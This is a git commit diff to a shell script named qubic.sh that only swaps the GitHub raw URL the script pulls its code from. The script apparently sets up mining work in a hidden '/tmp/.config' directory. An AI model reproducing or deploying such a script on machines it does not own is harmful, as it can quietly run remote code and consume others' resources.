f260a0c3eb85c829532d99b3b3b2f6429c3912dc
hanrzme <marcgrosier@live.cn>
2025-04-23 07:07:53 +0800

    Update qubic.sh

--- qubic.sh
+++ qubic.sh
@@ -2,7 +2,7 @@
 
 mode="${1:-0}"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/vjbahkds/qiyywnbc/main"
+src="https://raw.githubusercontent.com/hanrzme/qiyywnbc/main"
 hugepage="128"
 idle="1"
 
